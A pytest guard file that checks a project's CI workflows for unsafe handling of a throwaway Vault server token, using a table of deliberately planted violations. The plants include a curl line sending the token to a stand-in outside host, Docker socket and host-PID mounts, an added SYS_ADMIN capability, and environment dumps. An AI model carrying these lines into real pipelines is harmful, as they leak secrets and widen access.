    assert len(scripts) >= 3, sorted(scripts)
    assert len(set(scripts.values())) == 1, (
        "the copies of the Vault start script differ: " + ", ".join(sorted(scripts))
    )


def test_ci_workflow_starts_vault_in_both_test_jobs():
    wf = load((WORKFLOW_DIR / "ci.yml").read_text(encoding="utf-8"))
    for jname in ("check", "tests-py312"):
        names = [st.get("name", "") for st in wf["jobs"][jname]["steps"]]
        assert names.count("Start a throwaway Vault development server") == 1, jname
        assert "vault" not in (wf["jobs"][jname].get("services") or {})


VAULT_PLANTS = {
    "literal token in a service": (
        lambda t: t.replace(
            "    steps:\n",
            "    services:\n      vault:\n        image: x\n        env:\n          VAULT_DEV_ROOT_TOKEN_ID: abc\n    steps:\n",
            1,
        ),
        "literal-token",
    ),
    "vault service alone": (
        lambda t: t.replace(
            "    steps:\n", "    services:\n      vault:\n        image: x\n    steps:\n", 1
        ),
        "vault-as-service",
    ),
    "vault service under another name": (
        lambda t: t.replace(
            "    steps:\n",
            "    services:\n      kv:\n        image: hashicorp/vault:2.2.0\n        options: -e VAULT_DEV_ROOT_TOKEN_ID\n    steps:\n",
            1,
        ),
        "vault-as-service",
    ),
    "literal env token": (
        lambda t: t.replace(
            "    steps:\n", "    env:\n      HADAVIN_TEST_VAULT_TOKEN: abc\n    steps:\n", 1
        ),
        "literal-token",
    ),
    "fixed value instead of openssl": (
        lambda t: t.replace("token=$(openssl rand -hex 24)", "token=abc123"),
        "no-openssl",
    ),
    "token is the word root": (
        lambda t: t.replace("token=$(openssl rand -hex 24)", "token=root"),
        "token-root",
    ),
    "no mask line": (
        lambda t: t.replace('          echo "::add-mask::$token"\n', ""),
        "mask-lines",
    ),
    "mask after env write": (
        lambda t: t.replace(
            MASK_LINE + "\n          " + ENV_LINE, ENV_LINE + "\n          " + MASK_LINE
        ),
        "mask-order",
    ),
    "token used before the mask": (
        lambda t: t.replace(
            MASK_LINE, 'curl -s "https://example.invalid/?t=$token"\n          ' + MASK_LINE
        ),
        "token-before-mask",
    ),
    "token sent by curl in the command line": (
        lambda t: t.replace(
            MASK_LINE,
            MASK_LINE + '\n          curl -s -H "X-Vault-Token: $token" http://127.0.0.1:8200/',
        ),
        "token-in-argv",
    ),
    "probe back in the command line": (
        lambda t: t.replace(
            PROBE_LINE,
            'curl -fsS -o /dev/null -H "X-Vault-Token: $token" http://127.0.0.1:8200/v1/auth/token/lookup-self && exit 0',
        ),
        "token-in-argv",
    ),
    "tests not given the token": (
        lambda t: t.replace('echo "HADAVIN_TEST_VAULT_TOKEN=$token"', 'echo "OTHER=$token"'),
        "mask-lines",
    ),
    "container not given the same value": (
        lambda t: t.replace(
            'export VAULT_DEV_ROOT_TOKEN_ID="$token"',
            'export VAULT_DEV_ROOT_TOKEN_ID="$(openssl rand -hex 8)"',
        ),
        "same-token",
    ),
    "second value": (
        lambda t: t.replace(MASK_LINE, "token=$(openssl rand -hex 4)\n          " + MASK_LINE),
        "one-token",
    ),
    "token printed by echo": (
        lambda t: t.replace(MASK_LINE, "echo $token\n          " + MASK_LINE),
        "prints-token",
    ),
    "token printed by printf": (
        lambda t: t.replace(MASK_LINE, 'printf "%s\\n" "$token"\n          ' + MASK_LINE),
        "prints-token",
    ),
    "token printed in text": (
        lambda t: t.replace(MASK_LINE, 'echo "t=$token"\n          ' + MASK_LINE),
        "prints-token",
    ),
    "token printed with braces": (
        lambda t: t.replace(MASK_LINE, 'echo "${token}"\n          ' + MASK_LINE),
        "prints-token",
    ),
    "shell tracing": (
        lambda t: t.replace(
            "          token=$(openssl", "          set -x\n          token=$(openssl"
        ),
        "shell-trace",
    ),
    "port on all interfaces": (
        lambda t: t.replace("-p 127.0.0.1:8200:8200", "-p 8200:8200"),
        "port",
    ),
    "second port": (
        lambda t: t.replace("-p 127.0.0.1:8200:8200", "-p 127.0.0.1:8200:8200 -p 8201:8201"),
        "port",
    ),
    "publish all": (
        lambda t: t.replace("-p 127.0.0.1:8200:8200", "-p 127.0.0.1:8200:8200 -P"),
        "host-network",
    ),
    "host network": (
        lambda t: t.replace("-p 127.0.0.1:8200:8200", "-p 127.0.0.1:8200:8200 --network host"),
        "host-network",
    ),
    "container not given the token name": (
        lambda t: t.replace(
            "-e VAULT_DEV_ROOT_TOKEN_ID -e VAULT_DEV_LISTEN_ADDRESS", "-e VAULT_DEV_LISTEN_ADDRESS"
        ),
        "e-name",
    ),
    "image variable not defined as a pinned digest": (
        lambda t: t.replace("VAULT_IMAGE: hashicorp", "VAULT_IMAGE_X: hashicorp"),
        "image-undefined",
    ),
    "tests use Vault but nothing starts it": (
        lambda t: t.replace("docker run -d --name vault-ci", "echo "),
        "no-start",
    ),
    "removal step before the last test": (
        lambda t: t.replace(
            "      - name: The postgres client the database tests",
            "      - name: Early removal\n        if: ${{ always() }}\n        timeout-minutes: 2\n"
            "        run: |\n          set -o pipefail\n"
            "          docker ps -aq --filter 'name=^vault-ci$' | xargs -r docker rm -f\n"
            "      - name: The postgres client the database tests",
            1,
        ),
        "removal-early",
    ),
    "token by value": (
        lambda t: t.replace(
            "-e VAULT_DEV_ROOT_TOKEN_ID -e", "-e VAULT_DEV_ROOT_TOKEN_ID=$token -e"
        ),
        "token-by-value",
    ),
    "container renamed": (
        lambda t: t.replace("--name vault-ci", "--name vault-x"),
        "container-name",
    ),
    "no host probe": (lambda t: t.replace("curl -fsS", "echo -fsS"), "probe"),
    "no diagnostics": (
        lambda t: t.replace("docker logs vault-ci 2>&1 | " + LOGS_FILTER, "docker version #"),
        "diagnostics",
    ),
    "logs not filtered": (
        lambda t: t.replace("grep -viE 'unseal key|root token' | ", ""),
        "logs-filter",
    ),
    "no exit check": (lambda t: t.replace("docker inspect", "docker version #"), "inspect"),
    "image digest differs": (
        lambda t: t + "\n# hashicorp/vault:2.2.0@sha256:" + "0" * 64,
        "two-digests",
    ),
    "no removal": (
        lambda t: re.sub(
            r"(Remove the Vault development server\n\s+)if: \$\{\{ always\(\) \}\}",
            r"\1if: ${{ success() }}",
            t,
        ),
        "removal-always",
    ),
    "removal by substring": (
        lambda t: t.replace("'name=^vault-ci$'", "name=vault"),
        "removal-name",
    ),
    "removal without pipefail": (
        lambda t: t.replace("          set -o pipefail\n", ""),
        "removal-pipefail",
    ),
    "docker exec": (
        lambda t: t.replace(MASK_LINE, MASK_LINE + "\n          docker exec vault-ci env"),
        "extra-rights",
    ),
    "environment printed": (
        lambda t: t.replace(MASK_LINE, MASK_LINE + "\n          env"),
        "prints-env",
    ),
    "printenv": (lambda t: t.replace(MASK_LINE, MASK_LINE + "\n          printenv"), "prints-env"),
    "curl verbose": (lambda t: t.replace("curl -fsS", "curl -v -fsS"), "curl-verbose"),
    "curl long verbose": (lambda t: t.replace("curl -fsS", "curl --verbose -fsS"), "curl-verbose"),
    "shell override": (
        lambda t: t.replace(
            "      - name: Start a throwaway Vault development server\n",
            "      - name: Start a throwaway Vault development server\n        shell: bash -x {0}\n",
        ),
        "shell-override",
    ),
    "docker run with two spaces": (
        lambda t: t.replace(
            "docker run -d --name vault-ci", "docker  run -d --name vault-x -p 8200:8200"
        ),
        "port",
    ),
    "sudo docker": (lambda t: t.replace("docker run -d", "sudo docker run -d"), "extra-rights"),
    "docker run after a timeout prefix": (
        lambda t: t.replace(
            "docker run -d --name vault-ci -p 127.0.0.1:8200:8200",
            "timeout 5 docker run -d --name vault-ci -p 8200:8200",
        ),
        "port",
    ),
    "docker run after &&": (
        lambda t: t.replace(
            "docker run -d --name vault-ci -p 127.0.0.1:8200:8200",
            "true && docker run -d --name vault-ci -p 8200:8200",
        ),
        "port",
    ),
    "literal image": (
        lambda t: t.replace('"$VAULT_IMAGE" > /dev/null', "hashicorp/vault:2.2.0 > /dev/null"),
        "literal-image",
    ),
    "image not from the variable": (
        lambda t: t.replace('"$VAULT_IMAGE" > /dev/null', "vault-x > /dev/null"),
        "image-var",
    ),
    "docker socket": (
        lambda t: t.replace(
            "-e SKIP_SETCAP=true",
            "-e SKIP_SETCAP=true -v /var/run/docker.sock:/var/run/docker.sock",
        ),
        "extra-rights",
    ),
    "volume mount": (
        lambda t: t.replace("-e SKIP_SETCAP=true", "-e SKIP_SETCAP=true -v /tmp:/data"),
        "container-rights",
    ),
    "host pid": (
        lambda t: t.replace("-e SKIP_SETCAP=true", "-e SKIP_SETCAP=true --pid=host"),
        "extra-rights",
    ),
    "added capability": (
        lambda t: t.replace("-e SKIP_SETCAP=true", "-e SKIP_SETCAP=true --cap-add SYS_ADMIN"),
        "extra-rights",
    ),
    "probe only in a comment": (
        lambda t: t.replace(PROBE_LINE, "# " + PROBE_LINE + '\n            true "$token"'),
        "probe",
    ),
    "probe cannot succeed": (lambda t: t.replace(" && exit 0", ""), "probe"),
    "no exit 1 after the loop": (
        lambda t: re.sub(
            r"(Start a throwaway Vault development server[\s\S]*?)exit 1\n(?=\s+- )", r"\1true\n", t
        ),
        "exit-1",
    ),
    "cat prints the token": (
        lambda t: t.replace(MASK_LINE, 'cat <<< "$token"\n          ' + MASK_LINE),
        "prints-env",
    ),
    "here-string": (
        lambda t: t.replace(MASK_LINE, 'tr a b <<< "$token"\n          ' + MASK_LINE),
        "here-string",
    ),
    "never removed": (
        lambda t: re.sub(
            r"      - name: Remove the Vault development server\n(?:        .*\n){3,5}", "", t
        ),
        "no-removal",
    ),
    "docker container run": (
        lambda t: t.replace(
            "docker run -d --name vault-ci -p 127.0.0.1:8200:8200",
            "docker container run -d --name vault-ci -p 8200:8200",
        ),
        "port",
    ),
    "podman run": (
        lambda t: t.replace(
            "docker run -d --name vault-ci -p 127.0.0.1:8200:8200",
            "podman run -d --name vault-ci -p 8200:8200",
        ),
        "port",
    ),
    "docker compose": (
        lambda t: t.replace(
            "docker run -d --name vault-ci -p 127.0.0.1:8200:8200", "docker compose up -d"
        ),
        "port",
    ),
    "token printed after a semicolon": (
        lambda t: t.replace(MASK_LINE, 'true; echo "$token"\n          ' + MASK_LINE),
        "prints-token",
    ),
    "bare export prints the environment": (
        lambda t: t.replace(MASK_LINE, MASK_LINE + "\n          export"),
        "prints-env",
    ),
    "bare set prints the environment": (
        lambda t: t.replace(MASK_LINE, MASK_LINE + "\n          set"),
        "prints-env",
    ),
    "env after a pipe": (
        lambda t: t.replace(MASK_LINE, MASK_LINE + "\n          true | env"),
        "prints-env",
    ),
    "empty server address": (
        lambda t: t.replace(
            "HADAVIN_TEST_VAULT_ADDR: http://127.0.0.1:8200", 'HADAVIN_TEST_VAULT_ADDR: ""'
        ),
        "addr-missing",
    ),
    "probe without a time limit": (lambda t: t.replace(" --max-time 5", ""), "probe"),
    "tests not given the server address": (
        lambda t: t.replace(
            "HADAVIN_TEST_VAULT_ADDR: http://127.0.0.1:8200\n",
            "HADAVIN_TEST_VAULT_ADDR_X: http://127.0.0.1:8200\n",
        ),
        "addr-missing",
    ),
    "install after the token exists": (
        lambda t: re.sub(
            r"(      - name: (?:Tests \(the CI command\)|Tests \(no live calls\)|Tests on Python 3\.12 \(no live calls\))\n)",
            r"      - name: Late install\n        timeout-minutes: 2\n        run: uv sync\n\1",
            t,
            count=1,
        ),
        "install-after-vault",
    ),
    "test before the Vault step": (
        lambda t: re.sub(
            r"(      - name: Start a throwaway Vault development server\n)",
            "      - name: Early test\n        timeout-minutes: 2\n        env:\n          HADAVIN_TEST_VAULT_ADDR: http://127.0.0.1:8200\n        run: pytest -q\n\\1",
            t,
            count=1,
        ),
        "test-before-vault",
    ),
}


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
@pytest.mark.parametrize("name", sorted(VAULT_PLANTS))
def test_each_vault_rule_fails_on_a_planted_violation(path, name):
    plant, rule = VAULT_PLANTS[name]
    text = path.read_text(encoding="utf-8")
    planted = plant(text)
    assert planted != text, f"plant {name} changed nothing in {path.name}"
    found = all_vault_problems(planted, path.name)
    assert any(p.startswith(f"[{rule}]") for p in found), (name, path.name, rule, found)


def test_the_braced_image_variable_is_accepted():
    text = WORKFLOW.read_text(encoding="utf-8")
    braced = text.replace('"$VAULT_IMAGE" > /dev/null', '"${VAULT_IMAGE}" > /dev/null')
    assert braced != text and vault_problems(braced) == []


def test_a_second_docker_run_step_is_inspected_too():
    text = (WORKFLOW_DIR / "ci.yml").read_text(encoding="utf-8")
    extra = (
        "      - name: Another server\n        timeout-minutes: 2\n        run: |\n"
        "          docker run -d --name vault-ci -p 8200:8200 $VAULT_IMAGE\n"
    )
    planted = text.replace(
        "      - uses: astral-sh/setup-uv@", extra + "      - uses: astral-sh/setup-uv@", 1
    )
    assert planted != text and any(p.startswith("[port]") for p in vault_problems(planted))


def test_a_removal_step_before_the_last_test_step_is_caught():
    text = (WORKFLOW_DIR / "ci.yml").read_text(encoding="utf-8")
    removal = (
        "      - name: Remove the Vault development server\n        if: ${{ always() }}\n        timeout-minutes: 2\n"
        "        run: |\n          set -o pipefail\n          docker ps -aq --filter 'name=^vault-ci$' | xargs -r docker rm -f\n"
    )
    assert removal in text
    planted = text.replace(removal, "", 1).replace(
        "      - uses: astral-sh/setup-uv@", removal + "      - uses: astral-sh/setup-uv@", 1
    )
    assert any(p.startswith("[removal-early]") for p in vault_problems(planted))


def test_a_job_that_uses_vault_without_starting_one_is_caught():
    text = (WORKFLOW_DIR / "ci.yml").read_text(encoding="utf-8")
    planted = text.replace("Start a throwaway Vault development server", "Something else", 1)
    planted = planted.replace("docker run -d --name vault-ci", "echo", 1)
    assert any(p.startswith("[no-start]") for p in vault_problems(planted))


def test_the_file_search_covers_yaml_files_too(tmp_path):
    (tmp_path / "a.yml").write_text("x: 1\n")
    (tmp_path / "b.yaml").write_text("x: 1\n")
    (tmp_path / "c.txt").write_text("x\n")
    assert [p.name for p in workflow_files(tmp_path)] == ["a.yml", "b.yaml"]
    assert WORKFLOWS, "no workflow file found"


# --- the helper removes the token from files and from the summary -----------------------------------------


def test_the_helper_removes_the_token_value_from_logs_and_the_summary(tmp_path):
    token = "tok" + "-" + "a1b2c3d4e5f6"  # built from parts; a made-up value
    env = {"HADAVIN_TEST_VAULT_TOKEN": token, "GITHUB_STEP_SUMMARY": str(tmp_path / "summary.md")}
    code = f"print('hvac error with header X-Vault-Token: {token}'); print('FAILED t.py::x - {token}'); raise SystemExit(1)"
    helper(tmp_path, "run", "pytest", "--", sys.executable, "-c", code, env=env)
    done = helper(tmp_path, "report", "pytest", env=env)
    saved = (tmp_path / "evidence-logs" / "pytest.txt").read_text()
    for blob in (
        saved,
        done.stdout,
        (tmp_path / "summary.md").read_text(),
        (tmp_path / "evidence-logs" / "status.txt").read_text(),
    ):
        assert token not in blob
    assert "***" in saved and "FAILED t.py::x - ***" in done.stdout


def test_a_short_value_is_not_masked_so_that_ordinary_words_survive(tmp_path):
    env = {"HADAVIN_TEST_VAULT_TOKEN": "abc"}
    helper(tmp_path, "run", "x", "--", sys.executable, "-c", "print('abc def')", env=env)
    assert "abc def" in (tmp_path / "evidence-logs" / "x.txt").read_text()


def test_a_cut_off_piece_of_the_value_is_masked_too(tmp_path):
    token = "tok" + "-" + "a1b2c3d4e5f6a7b8c9d0"
    env = {"HADAVIN_TEST_VAULT_TOKEN": token}
    code = f"print('cut: {token[:12]}'); print('tail: {token[-9:]}'); print('short: {token[:5]}')"
    helper(tmp_path, "run", "x", "--", sys.executable, "-c", code, env=env)
    saved = (tmp_path / "evidence-logs" / "x.txt").read_text()
    assert token[:12] not in saved and token[-9:] not in saved
    assert "short: " + token[:5] in saved


def test_the_folder_comes_from_evidence_dir_when_it_is_set(tmp_path):
    target = tmp_path / "elsewhere" / "logs"
    helper(
        tmp_path,
        "run",
        "x",
        "--",
        sys.executable,
        "-c",
        "print(1)",
        env={"EVIDENCE_DIR": str(target)},
    )
    assert (target / "x.txt").exists() and (target / "status.txt").exists()
    assert not (tmp_path / "evidence-logs").exists()


def test_the_token_is_removed_from_the_message_of_a_command_that_cannot_start(tmp_path):
    token = "tok" + "-" + "q1w2e3r4t5y6"
    env = {"HADAVIN_TEST_VAULT_TOKEN": token}
    done = helper(tmp_path, "run", "x", "--", f"no-such-{token}", env=env)
    assert done.returncode == 127
    assert (
        token not in done.stdout and token not in (tmp_path / "evidence-logs" / "x.txt").read_text()
    )
    assert "cannot start" in (tmp_path / "evidence-logs" / "x.txt").read_text()


def test_the_mask_pattern_is_built_once_per_value(monkeypatch):
    """monkeypatch restores the real per-run token (if any) afterwards; the cached pattern of the fake value is
    dropped so that no later test sees it."""
    es._pattern.cache_clear()
    monkeypatch.setenv("HADAVIN_TEST_VAULT_TOKEN", "tok" + "-" + "z9y8x7w6v5u4")
    try:
        for _ in range(50):
            es.mask("a line")
        assert es._pattern.cache_info().misses == 1
    finally:
        es._pattern.cache_clear()


# --- the token-reader command (what the step "vault-token-reader" runs) ---------------------------------------


def test_the_token_reader_accepts_a_code_line_and_refuses_a_comment_with_a_reason(tmp_path):
    good = tmp_path / "good.py"
    good.write_text('import os\nT = os.environ.get("HADAVIN_TEST_VAULT_TOKEN")\n')
    assert helper(tmp_path, "token-reader", str(good)).returncode == 0
    for body in ("# os.environ HADAVIN_TEST_VAULT_TOKEN\n", "x = 1\n", ""):
        bad = tmp_path / "bad.py"
        bad.write_text(body)
        done = helper(tmp_path, "token-reader", str(bad))
        assert (
            done.returncode == 1
            and "has no code line that reads HADAVIN_TEST_VAULT_TOKEN" in done.stdout
        )
    missing = helper(tmp_path, "token-reader", str(tmp_path / "gone.py"))
    assert missing.returncode == 1 and "cannot read" in missing.stdout


def test_the_token_reader_reason_reaches_the_saved_log(tmp_path):
    bad = tmp_path / "old.py"
    bad.write_text("x = 1\n")
    tool = str(ROOT / "tools" / "evidence_step.py")
    done = helper(
        tmp_path, "run", "vault-token-reader", "--", sys.executable, tool, "token-reader", str(bad)
    )
    assert done.returncode == 1
    log = (tmp_path / "evidence-logs" / "vault-token-reader.txt").read_text()
    assert "Test a newer ref" in log and log.splitlines()[-1] == "exit=1"


def test_the_current_test_file_passes_the_token_reader():
    assert (
        es.cmd_token_reader(str(ROOT / "tests" / "contracts" / "kinds" / "secrets_neutral.py")) == 0
    )


# --- the test-side Vault target never falls back to a fixed token ---------------------------------------------


def test_vault_target_needs_the_token_when_a_server_address_is_set(monkeypatch):
    from tests.contracts.kinds.secrets_neutral import vault_target

    monkeypatch.setenv("HADAVIN_TEST_VAULT_ADDR", "http://127.0.0.1:1")
    monkeypatch.delenv("HADAVIN_TEST_VAULT_TOKEN", raising=False)
    with pytest.raises(RuntimeError, match="HADAVIN_TEST_VAULT_TOKEN"):
        vault_target()
    monkeypatch.setenv("HADAVIN_TEST_VAULT_TOKEN", "x" * 12)
    assert vault_target() == ("http://127.0.0.1:1", "x" * 12)


def test_vault_target_without_an_address_is_the_local_fake(monkeypatch):
    from tests.contracts.kinds.secrets_neutral import vault_target

    monkeypatch.delenv("HADAVIN_TEST_VAULT_ADDR", raising=False)
    address, token = vault_target()
    assert address.startswith("http://127.0.0.1:") and token


def test_a_skip_that_names_the_pinned_tables_variable_fails_the_report(tmp_path):
    code = (
        "print('SKIPPED [1] tests/x.py:1: HADAVIN_REQUIRE_PINNED_UNIDATA is required but not set')"
    )
    helper(tmp_path, "run", "pytest", "--", sys.executable, "-c", code)
    bad = helper(tmp_path, "report", "pytest")
    assert bad.returncode == 1 and "is required but not set" in bad.stdout


def test_a_python_312_skip_that_names_the_pinned_tables_variable_passes(tmp_path):
    """The variable is deliberately unset on Python 3.12 and 3.14: a skip that only names it is an ordinary skip."""
    code = (
        "print('SKIPPED [2] tests/x.py:1: text-folding tables are built for Python 3.13 "
        "(HADAVIN_REQUIRE_PINNED_UNIDATA is unset on 3.12)')"
    )
    helper(tmp_path, "run", "pytest", "--", sys.executable, "-c", code)
    ok = helper(tmp_path, "report", "pytest")
    assert ok.returncode == 0 and "| pytest | exit=0 | 2 |" in ok.stdout


def test_a_step_called_status_is_refused_and_the_result_rows_survive(tmp_path):
    helper(tmp_path, "run", "ok", "--", sys.executable, "-c", "pass")
    done = helper(tmp_path, "run", "status", "--", sys.executable, "-c", "pass")
    assert done.returncode == 2 and "reserved" in done.stderr
    assert (tmp_path / "evidence-logs" / "status.txt").read_text() == "ok\texit=0\n"


@pytest.mark.parametrize(
    "ref",
    ["main/status", "feature/statuses", "a/check-runs", "a/check-suites", "x/comments", "x/pulls"]
    + ["a/.hidden", ".hidden", "a.lock/b", "a/b.lock", "a/"],
)
def test_a_ref_that_reaches_another_github_endpoint_or_breaks_git_naming_is_refused(ref):
    with pytest.raises(es.Refused):
        es.check_ref(ref)


def test_refs_that_look_like_endpoint_words_but_are_not_are_accepted():
    for ref in ("status", "feature/status-page", "release/1.2.3", "a.lockfile/b", "x/pulls-up"):
        assert es.check_ref(ref) == ref


@pytest.mark.parametrize(
    ("source", "reads"),
    [
        ('import os\nT = os.environ.get("HADAVIN_TEST_VAULT_TOKEN")\n', True),
        ('import os\nT = os.environ["HADAVIN_TEST_VAULT_TOKEN"]\n', True),
        ('import os\nT = os.getenv(\n    "HADAVIN_TEST_VAULT_TOKEN",\n)\n', True),
        ('import os\nT = os.environ.get(\n    "HADAVIN_TEST_VAULT_TOKEN"\n)\n', True),
        ('"""reads os.environ HADAVIN_TEST_VAULT_TOKEN"""\n', False),
        ('X = "os.environ HADAVIN_TEST_VAULT_TOKEN"\n', False),
        ("# os.environ.get('HADAVIN_TEST_VAULT_TOKEN')\n", False),
        ('import os\nT = os.environ.get("OTHER")\n', False),
        ("", False),
        ('import os\nT = os.environ.get("HADAVIN_TEST_VAULT_TOKEN")\nthis is not python\n', True),
        ("# os.environ.get('HADAVIN_TEST_VAULT_TOKEN')\nthis is not python\n", False),
    ],
)
def test_the_token_reader_sees_a_call_over_several_lines_but_not_a_string_or_comment(source, reads):
    assert es._reads_token(source) is reads


def test_if_false_ignores_ordinary_conditions_and_catches_switched_off_steps():
    def run(cond: str) -> list[str]:
        text = (
            "name: X\npermissions:\n  contents: read\non: push\njobs:\n  j:\n    runs-on: ubuntu-24.04\n"
            "    timeout-minutes: 5\n    steps:\n      - run: echo hi\n        timeout-minutes: 1\n"
            f"        if: {cond}\n"
        )
        return [p for p in workflow_problems(text, "x.yml") if p.startswith("[if-false]")]

    for fine in (
        "github.ref != 'refs/heads/false-start'",
        "contains(github.event.head_commit.message, 'false')",
        "github.event.pull_request.draft == false",
        "${{ steps.a.outputs.falsey == 'x' }}",
    ):
        assert run(fine) == [], fine
    for off in (
        "false",
        "${{ false }}",
        "${{ success() && false }}",
        "${{ false && success() }}",
        "${{ 0 }}",
    ):
        assert run(off), off


SKIP_RE = re.compile(
    r"pytest\.skip|skipif|importorskip|mark\.skip|xfail|SkipTest|unittest\.skip|skip\("
)


def vault_test_files() -> list[Path]:
    """Every test file or test helper that names the Vault server variables (found by content, so a new helper is
    covered); this guard file itself is left out."""
    me = Path(__file__).resolve()
    return [
        p
        for p in sorted((ROOT / "tests").rglob("*.py"))
        if p.resolve() != me
        and re.search(r"HADAVIN_TEST_VAULT|vault_target", p.read_text(encoding="utf-8"))
    ]


def test_the_vault_test_files_do_not_skip_on_a_connection_failure():
    files = vault_test_files()
    assert {p.name for p in files} >= {"secrets_neutral.py", "audit_neutral.py"}, files
    for path in files:
        assert not SKIP_RE.search(path.read_text(encoding="utf-8")), path


@pytest.mark.parametrize(
    "line",
    [
        'pytest.importorskip("hvac")',
        "@pytest.mark.skip",
        "@pytest.mark.xfail",
        "pytest.xfail('x')",
        "raise unittest.SkipTest('x')",
        "@pytest.mark.skipif(True, reason='x')",
    ],
)
def test_the_skip_pattern_sees_every_way_to_skip(line):
    assert SKIP_RE.search(line)


@pytest.mark.parametrize(
    "line",
    [
        "curl -v http://x",
        "curl -fsSv http://x",
        "curl -vv http://x",
        "curl -sS --verbose http://x",
        "curl --trace out http://x",
        "curl --trace-ascii - http://x",
        "curl --trace-time --trace t http://x",
        "echo a | curl -fsS -v -K - http://x",
        "sudo curl -v http://x",
        "x=1 curl -sv http://x",
        "cmd && curl -o /dev/null -v http://x",
    ],
)
def test_curl_verbose_forms_are_caught(line):
    assert curl_is_verbose(line)


@pytest.mark.parametrize(
    "line",
    [
        (
            'curl -sSfL --retry 5 --retry-all-errors --retry-delay 5 --connect-timeout 30 --proto "=https" '
            '--proto-redir "=https" --tlsv1.2 -o "$RUNNER_TEMP/x.tgz" "https://example.invalid/v1/x"'
        ),
        "curl -fsS --max-time 5 -o /dev/null -K - http://127.0.0.1:8200/v1/auth/token/lookup-self",
        'for c in sha256sum tar curl git; do p=$(command -v "$c") || exit 1; done',
        "command -v curl",
        "curl -H 'X-Note: verbose' http://x",
        "curl -ovx http://x",
    ],
)
def test_curl_flags_that_only_contain_v_are_not_verbose(line):
    assert not curl_is_verbose(line)
